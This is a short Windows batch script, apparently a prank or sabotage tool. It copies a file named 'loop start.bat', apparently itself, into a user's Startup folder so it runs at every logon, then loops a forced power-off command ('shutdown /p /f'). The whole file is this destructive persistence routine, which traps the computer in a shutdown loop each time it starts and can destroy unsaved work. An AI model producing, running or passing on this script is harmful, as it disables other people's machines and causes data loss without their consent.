@echo off
copy "loop start.bat" "C:\Users\thund\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
GOTO start

:start
shutdown /p /f
GOTO start
